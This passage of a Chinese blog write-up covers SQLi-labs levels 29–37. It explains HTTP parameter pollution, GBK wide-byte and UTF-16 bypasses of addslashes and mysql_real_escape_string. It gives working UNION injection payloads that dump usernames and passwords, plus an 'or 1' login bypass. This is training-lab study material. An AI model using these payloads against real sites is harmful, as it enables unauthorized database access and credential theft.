            <span class="hljs-keyword">return</span> <span class="hljs-variable">$id_value</span>;
            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;
            <span class="hljs-keyword">break</span>;
        &#125;
    &#125;
&#125;

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">whitelist</span>(<span class="hljs-params"><span class="hljs-variable">$input</span></span>)</span>
<span class="hljs-function"></span>&#123;
    <span class="hljs-comment"># 过滤规则 检测数字</span>
    <span class="hljs-variable">$match</span> = preg_match(<span class="hljs-string">&quot;/^\d+$/&quot;</span>, <span class="hljs-variable">$input</span>);
    <span class="hljs-keyword">if</span> 不符合规则：
        header(<span class="hljs-string">&#x27;Location: hacked.php&#x27;</span>);
&#125;</code></pre><p>从代码中还是很容易发现问题的，关键问题出在下面的地方：</p><pre><code class="hljs Php"><span class="hljs-variable">$id1</span>=java_implimentation(<span class="hljs-variable">$qs</span>);
...
whitelist(<span class="hljs-variable">$id1</span>);</code></pre><p><code>whitelist</code> 过滤是比较严格的，如果 id 不是数字的话就会直接重定向到 <code>hacked.php</code>，这里是没毛病的。那么问题出在了这里函数<code>$id1=java_implimentation($qs);</code></p><p>因为 return 表示了函数的结束运行，所以这个函数捕捉到 id 的时候就会返回 <code>return $id_value</code>，这样就导致了 用户加入构造两组 id 的话，那么后面的 id 就会绕过函数检测。</p><p>假设用户输入这样的语句：</p><pre><code class="hljs Php">index.php?id=<span class="hljs-number">1</span>&amp;id=<span class="hljs-number">2</span></code></pre><p>Apache PHP 会解析最后一个参数</p><p>Tomcat JSP 会解析第一个参数</p><p>知道这个原理的话后面尝试直接注入吧：</p><pre><code class="hljs sql">login.php?id=2&amp;id=-2&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(username,<span class="hljs-keyword">password</span> SEPARATOR <span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>),<span class="hljs-number">3</span> <span class="hljs-comment">--+</span></code></pre><h2 id="Less-30"><a href="#Less-30" class="headerlink" title="Less-30"></a>Less-30</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>id=&quot;$id&quot;</code></td></tr></tbody></table><p>和 Less-29 相比没有啥本质变化，只是拼接方式不一样。</p><pre><code class="hljs sql">login.php?id=2&amp;id=-2&quot; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(username,<span class="hljs-keyword">password</span> SEPARATOR <span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>),<span class="hljs-number">3</span> <span class="hljs-comment">--+</span></code></pre><h2 id="Less-31"><a href="#Less-31" class="headerlink" title="Less-31"></a>Less-31</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>id=（&quot;$id&quot;）</code></td></tr></tbody></table><p>和 Less-29 相比没有啥本质变化，只是拼接方式不一样。</p><pre><code class="hljs sql">login.php?id=2&amp;id=-2&quot;) union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(username,<span class="hljs-keyword">password</span> SEPARATOR <span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>),<span class="hljs-number">3</span> <span class="hljs-comment">--+</span></code></pre><h2 id="Less-32-宽字节注入"><a href="#Less-32-宽字节注入" class="headerlink" title="Less-32(宽字节注入)"></a>Less-32(宽字节注入)</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p>考察 Bypass addslashes()，关键的防护代码如下：</p><pre><code class="hljs Php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]))
<span class="hljs-variable">$id</span>=check_addslashes(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]);

<span class="hljs-comment"># 在&#x27; &quot; \ 等敏感字符前面添加反斜杠</span>
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_addslashes</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span>
<span class="hljs-function"></span>&#123;        <span class="hljs-comment"># \ 转换为 \\</span>
    <span class="hljs-variable">$string</span> = preg_replace(<span class="hljs-string">&#x27;/&#x27;</span>. preg_quote(<span class="hljs-string">&#x27;\\&#x27;</span>) .<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-string">&quot;\\\\\\&quot;</span>, <span class="hljs-variable">$string</span>);          将       <span class="hljs-comment"># 将 &#x27; 转为\&quot;</span>
    <span class="hljs-variable">$string</span> = preg_replace(<span class="hljs-string">&#x27;/\&#x27;/i&#x27;</span>, <span class="hljs-string">&#x27;\\\&#x27;&#x27;</span>, <span class="hljs-variable">$string</span>);   
      <span class="hljs-comment"># 将 &quot; 转为\&quot;</span>
    <span class="hljs-variable">$string</span> = preg_replace(<span class="hljs-string">&#x27;/\&quot;/&#x27;</span>, <span class="hljs-string">&quot;\\\&quot;&quot;</span>, <span class="hljs-variable">$string</span>);                                
    <span class="hljs-keyword">return</span> <span class="hljs-variable">$string</span>;
&#125;</code></pre><p><strong>宽字节注入原理</strong></p><p>MySQL 在使用 GBK 编码的时候，会认为两个字符为一个汉字，例如 <code>%aa%5c</code> 就是一个 汉字。因为过滤方法主要就是在敏感字符前面添加 反斜杠 <code>\</code>，所以这里想办法干掉反斜杠即可。</p><p>1、<code>%df</code> 吃掉 <code>\</code></p><p>具体的原因是 <code>urlencode(\&#39;) = %5c%27</code>，我们在<code>%5c%27</code> 前面添加<code>%df</code>，形 成<code>%df%5c%27</code>，MySQL 在 GBK 编码方式的时候会将两个字节当做一个汉字，这个时候就把<code>%df%5c</code> 当做是一个汉字，<code>%27</code> 则作为一个单独的符号在外面，同时也就达到了我们的目的。</p><p>2、将 <code>\&#39;</code> 中的 <code>\</code> 过滤掉</p><p>例如可以构造 <code>%5c%5c%27</code> 的情况，后面的<code>%5c</code>会被前面的<code>%5c</code> 给注释掉。这也是 bypass 的一种方法。</p><p>本关卡采用第一种 %df 宽字节注入来吃掉反斜杠，下面直接丢 payload 吧：</p><pre><code class="hljs sql">?id=-1%df&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(username,<span class="hljs-keyword">password</span> SEPARATOR <span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>),<span class="hljs-number">3</span> <span class="hljs-comment">--+</span></code></pre><h2 id="Less-33"><a href="#Less-33" class="headerlink" title="Less-33"></a>Less-33</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p>拼接方式也是一样的，过滤方法细节有点变化，具体如下：</p><pre><code class="hljs Php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_addslashes</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span>
<span class="hljs-function"></span>&#123;
    <span class="hljs-variable">$string</span>= addslashes(<span class="hljs-variable">$string</span>);    
    <span class="hljs-keyword">return</span> <span class="hljs-variable">$string</span>;
&#125;</code></pre><p><code>addslashes()</code> 函数返回在预定义字符之前添加反斜杠的字符串。</p><table><thead><tr><th>预定义字符</th><th>转义后</th></tr></thead><tbody><tr><td><code>\</code></td><td><code>\\</code></td></tr><tr><td><code>&#39;</code></td><td><code>\&#39;</code></td></tr><tr><td><code>&quot;</code></td><td><code>\&quot;</code></td></tr></tbody></table><p>该函数可用于为存储在数据库中的字符串以及数据库查询语句准备字符串，和 Less-32 的函数功能是差不的，依旧可以使用宽字节进行注入。</p><blockquote><p>注入天书：使用 addslashes(),我们需要将 mysql_query 设置为 binary 的方式，才能防御此漏洞</p></blockquote><h2 id="Less-34"><a href="#Less-34" class="headerlink" title="Less-34"></a>Less-34</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>username=&#39;$uname&#39;</code></td></tr></tbody></table><p>过滤方法依然和 Less-33 一致：</p><pre><code class="hljs php"><span class="hljs-variable">$uname</span> = addslashes(<span class="hljs-variable">$uname1</span>);
<span class="hljs-variable">$passwd</span>= addslashes(<span class="hljs-variable">$passwd1</span>);</code></pre><p>只是由 GET 型变成了 POST 型，所以下面直接丢 POST 的数据包 payload 了：</p><pre><code class="hljs sql">uname=admin%df&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(username,<span class="hljs-keyword">password</span> SEPARATOR <span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>)<span class="hljs-comment">#&amp;passwd=admin</span></code></pre><p>MySQL 注入天书这里介绍了一个新的方法</p><p>将 utf-8 转换为 utf-16 或 utf-32，例如将 <code>&#39;</code> 转为 utf-16 为<code>�</code></p><p>我们就 可以利用这个方式进行尝试，可以使用 Linux 自带的 iconv 命令进行 UTF 的编码转换：</p><pre><code class="hljs Bash">➜  ~ <span class="hljs-built_in">echo</span> \<span class="hljs-string">&#x27;|iconv -f utf-8 -t utf-16</span>
<span class="hljs-string">��&#x27;</span>
➜  ~ <span class="hljs-built_in">echo</span> \<span class="hljs-string">&#x27;|iconv -f utf-8 -t utf-32</span>
<span class="hljs-string">��&#x27;</span></code></pre><p>首先尝试一个经典的万能密码：</p><pre><code class="hljs Payload">uname&#x3D;�&#39; or 1#&amp;passwd&#x3D;</code></pre><p>为什么这个万能密码可以生效呢，因为拼接到 SQL 中是如下的效果：</p><pre><code class="hljs Sql"><span class="hljs-keyword">SELECT</span> username, <span class="hljs-keyword">password</span> <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">WHERE</span> username=<span class="hljs-string">&#x27;�&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-comment">#and password=&#x27;$passwd&#x27; LIMIT 0,1</span></code></pre><p><code>or 1</code> 是一个永真的条件，不论 select 选择出的内容是什么。<code>or 1</code> 之后时钟都是 1，下面是控制后台的演示：</p><pre><code class="hljs Bash"><span class="hljs-comment"># where username = &#x27;x&#x27; or 1</span>
mysql&gt;  select * from users <span class="hljs-built_in">where</span> username = <span class="hljs-string">&#x27;x&#x27;</span> or 1;
+----+------------+----------+
| id | username   | password |
+----+------------+----------+
|  1 | Dumb       | 0        |
|  2 | Angelina   | 0        |
|  3 | Dummy      | 0        |
|  4 | secure     | 0        |
|  5 | stupid     | 0        |
|  6 | superman   | 0        |
|  7 | batman     | 0        |
|  8 | admin      | 1234     |
|  9 | admin1     | 0        |
| 10 | admin2     | 0        |
| 11 | admin3     | 0        |
| 12 | dhakkan    | 0        |
| 14 | admin4     | 0        |
| 15 | admin<span class="hljs-string">&#x27;#sec | 123      |</span>
<span class="hljs-string">+----+------------+----------+</span>
<span class="hljs-string">14 rows in set (0.00 sec)</span>
<span class="hljs-string"></span>
<span class="hljs-string"># where username = &#x27;</span>x<span class="hljs-string">&#x27; or 0</span>
<span class="hljs-string">mysql&gt;  select * from users where username = &#x27;</span>x<span class="hljs-string">&#x27; or 0;</span>
<span class="hljs-string">Empty set (0.00 sec)</span>
<span class="hljs-string"></span>
<span class="hljs-string"># where 1</span>
<span class="hljs-string">mysql&gt;  select * from users where 1;</span>
<span class="hljs-string">+----+------------+----------+</span>
<span class="hljs-string">| id | username   | password |</span>
<span class="hljs-string">+----+------------+----------+</span>
<span class="hljs-string">|  1 | Dumb       | 0        |</span>
<span class="hljs-string">|  2 | Angelina   | 0        |</span>
<span class="hljs-string">|  3 | Dummy      | 0        |</span>
<span class="hljs-string">|  4 | secure     | 0        |</span>
<span class="hljs-string">|  5 | stupid     | 0        |</span>
<span class="hljs-string">|  6 | superman   | 0        |</span>
<span class="hljs-string">|  7 | batman     | 0        |</span>
<span class="hljs-string">|  8 | admin      | 1234     |</span>
<span class="hljs-string">|  9 | admin1     | 0        |</span>
<span class="hljs-string">| 10 | admin2     | 0        |</span>
<span class="hljs-string">| 11 | admin3     | 0        |</span>
<span class="hljs-string">| 12 | dhakkan    | 0        |</span>
<span class="hljs-string">| 14 | admin4     | 0        |</span>
<span class="hljs-string">| 15 | admin&#x27;</span><span class="hljs-comment">#sec | 123      |</span>
+----+------------+----------+
14 rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)

<span class="hljs-comment"># where 0</span>
mysql&gt; select * from users <span class="hljs-built_in">where</span> 0;
Empty <span class="hljs-built_in">set</span> (0.00 sec)</code></pre><p>那么直接尝试一下最基本的联合查询注入看看：</p><pre><code class="hljs sql">uname=�&#x27; and 1=2 union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(username,<span class="hljs-keyword">password</span> SEPARATOR <span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>)<span class="hljs-comment">#&amp;passwd=</span></code></pre><p>也是 OK 的</p><h2 id="Less-35"><a href="#Less-35" class="headerlink" title="Less-35"></a>Less-35</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>id=$id</code></td></tr></tbody></table><p>Less-35 的防护措施有点搞笑，首先 id 使用了如下规则过滤：</p><pre><code class="hljs Php"><span class="hljs-variable">$id</span>=check_addslashes(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]);

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_addslashes</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span>
<span class="hljs-function"></span>&#123;
    <span class="hljs-variable">$string</span> = addslashes(<span class="hljs-variable">$string</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-variable">$string</span>;
&#125;</code></pre><p>但是本关的拼接方式是：</p><pre><code class="hljs Bash"><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=<span class="hljs-variable">$id</span> LIMIT 0,1&quot;</span>;</code></pre><p>实际进行注入利用的时候并不需要写单引号，那么就尝试直接注入看看吧：</p><pre><code class="hljs sql">?id=-1 union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(username,<span class="hljs-keyword">password</span> SEPARATOR <span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>),<span class="hljs-number">3</span> <span class="hljs-comment">--+</span></code></pre><h2 id="Less-36-Bypass-mysql-real-escape-string"><a href="#Less-36-Bypass-mysql-real-escape-string" class="headerlink" title="Less-36(Bypass mysql_real_escape_string)"></a>Less-36(Bypass mysql_real_escape_string)</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p>主要防护代码：</p><pre><code class="hljs Php"><span class="hljs-variable">$id</span>=check_quotes(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]);

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_quotes</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span>
<span class="hljs-function"></span>&#123;
    <span class="hljs-variable">$string</span>= mysql_real_escape_string(<span class="hljs-variable">$string</span>);    
    <span class="hljs-keyword">return</span> <span class="hljs-variable">$string</span>;
&#125;</code></pre><p>这一关主要考查了 Bypass MySQL Real Escape String，mysql_real_escape_string 会检测并转义如下危险字符：</p><table><thead><tr><th>危险字符</th><th>转义后</th></tr></thead><tbody><tr><td><code>\</code></td><td><code>\\</code></td></tr><tr><td><code>&#39;</code></td><td><code>\&#39;</code></td></tr><tr><td><code>&quot;</code></td><td><code>\&quot;</code></td></tr></tbody></table><p>这一关使用 Less-34 关的两种思路依然是可行的，下面直接尝试 payload 进行注入吧：</p><pre><code class="hljs sql">?id=-1%df&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(username,<span class="hljs-keyword">password</span> SEPARATOR <span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>) <span class="hljs-comment">--+ </span></code></pre><p>或者</p><pre><code class="hljs sql">?id=-1�&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(username,<span class="hljs-keyword">password</span> SEPARATOR <span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>) <span class="hljs-comment">--+ </span></code></pre><h2 id="Less-37"><a href="#Less-37" class="headerlink" title="Less-37"></a>Less-37</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>username=&#39;$uname&#39;</code></td></tr></tbody></table><p>依然使用了 和 Less-36 的防护方法：</p><pre><code class="hljs Php"><span class="hljs-variable">$uname</span> = mysql_real_escape_string(<span class="hljs-variable">$uname1</span>);
<span class="hljs-variable">$passwd</span>= mysql_real_escape_string(<span class="hljs-variable">$passwd1</span>);</code></pre><p>所以利用思路也是一毛一样的，只是由 GET 型变成了 POST 型了，下面就直接尝试注入吧：</p><pre><code class="hljs sql">uname=admin%df&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">GROUP_CONCAT</span>(username,<span class="hljs-keyword">password</span> SEPARATOR <span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span>)<span class="hljs-comment">#&amp;passwd=admin</span></code></pre><p>或者：</p><pre><code class="hljs sql">uname=�&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">GROUP_CONCAT</span>(username,<span class="hljs-keyword">password</span> SEPARATOR <span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span>)<span class="hljs-comment">#&amp;passwd=</span></code></pre></div><hr><div><div class="post-metas mb-3"><div class="post-meta mr-3"><i class="iconfont icon-category"></i> <a class="hover-with-bg" href="/categories/WEB%E5%AE%89%E5%85%A8/">WEB安全</a></div><div class="post-meta"><i class="iconfont icon-tags"></i> <a class="hover-with-bg" href="/tags/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a> <a class="hover-with-bg" href="/tags/sqli-lab/">sqli lab</a></div></div><p class="note note-warning"><strong>本文作者: </strong><a href="/">iceH</a><br><strong>本文链接: </strong><a href="http://www.secice.cn/p/4c595109">http://www.secice.cn/p/4c595109</a><br><strong>版权声明: </strong>本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p><div class="post-prevnext row"><article class="post-prev col-6"><a href="/p/1f400290"><i class="iconfont icon-arrowleft"></i> <span class="hidden-mobile">SQLI labs 靶场笔记之堆叠注入 38-53 关</span> <span class="visible-mobile">上一篇</span></a></article><article class="post-next col-6"><a href="/p/22efef48"><span class="hidden-mobile">SQLI labs 靶场笔记之基础挑战 1-20 关</span> <span class="visible-mobile">下一篇</span> <i class="iconfont icon-arrowright"></i></a></article></div></div><article class="comments" id="comments"><div id="vcomments"></div><script type="text/javascript">Fluid.utils.waitElementVisible("vcomments",(function(){Fluid.utils.createScript("https://cdn.staticfile.org/valine/1.4.14/Valine.min.js",(function(){new Valine({el:"#vcomments",app_id:"MnjV8raNBztIVGGKiicFL3Sq-MdYXbMMI",app_key:"hS70MmgmzDqbMSkSAfkDe42h",placeholder:"留下你的小脚印吧...",path:window.location.pathname,avatar:"wavatar",meta:["nick","mail"],pageSize:"10",lang:"zh-CN",highlight:!1,recordIP:!1,serverURLs:""})}))}))</script><noscript>Please enable JavaScript to view the <a target="_blank" href="https://valine.js.org" rel="nofollow noopener noopener">comments powered by Valine.</a></noscript></article></article></div></div></div><div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn"><div id="toc"><p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p><div class="toc-body" id="toc-body"></div></div></div></div></div><div class="col-lg-7 mx-auto nopadding-md"><div class="container custom post-custom mx-auto"><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/img/psb.gif" srcset="/img/loading.gif" class="rounded mx-auto d-block mt-5" style="width:300px;height:150px"></div></div><a id="scroll-top-button" href="#" role="button"><i class="iconfont icon-arrowup" aria-hidden="true"></i></a><div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true"><div class="modal-dialog modal-dialog-scrollable modal-lg" role="document"><div class="modal-content"><div class="modal-header text-center"><h4 class="modal-title w-100 font-weight-bold">搜索</h4><button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button></div><div class="modal-body mx-3"><div class="md-form mb-5"><input type="text" id="local-search-input" class="form-control validate"> <label data-error="x" data-success="v" for="local-search-input">关键词</label></div><div class="list-group" id="local-search-result"></div></div></div></div></div></main><footer class="text-center mt-5 py-3"><div class="footer-content"><span>iceH</span> <i class="iconfont icon-love"></i> <span>一条啥也不会的咸鱼！</span></div></footer><script src="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.js"></script><link rel="stylesheet" href="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.css"><script>NProgress.configure({showSpinner:!1,trickleSpeed:200}),NProgress.start(),document.addEventListener("DOMContentLoaded",(function(){window.NProgress&&window.NProgress.inc()})),window.addEventListener("load",(function(){NProgress.done()}))</script><script src="https://cdn.staticfile.org/jquery/3.5.1/jquery.min.js"></script><script src="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/js/bootstrap.min.js"></script><script src="/js/debouncer.js"></script><script src="/js/events.js"></script><script src="/js/plugins.js"></script><script src="/js/lazyload.js"></script><script src="https://cdn.staticfile.org/tocbot/4.12.0/tocbot.min.js"></script><script src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js"></script><script src="https://cdn.staticfile.org/anchor-js/4.3.0/anchor.min.js"></script><script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js"></script><script src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js"></script><script>!function(t,i){(0,Fluid.plugins.typing)(i.getElementById("subtitle").title)}(window,document)</script><script src="/js/local-search.js"></script><script>document.querySelector("#local-search-input").onclick=function(){searchFunc("/local-search.xml","local-search-input","local-search-result"),this.onclick=null}</script><script src="https://gitee.com/sec-pengyy/sec-pengyy/raw/master/js/qipao.js"></script><script src="https://gitee.com/sec-pengyy/sec-pengyy/raw/master/js/jingtaisidai.js"></script><script src="https://gitee.com/sec-pengyy/sec-pengyy/raw/master/js/dianjichuzi.js"></script><script src="//cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="//cdn.jsdelivr.net/gh/metowolf/MetingJS@1.2/dist/Meting.min.js"></script><script src="/js/boot.js"></script></body></html>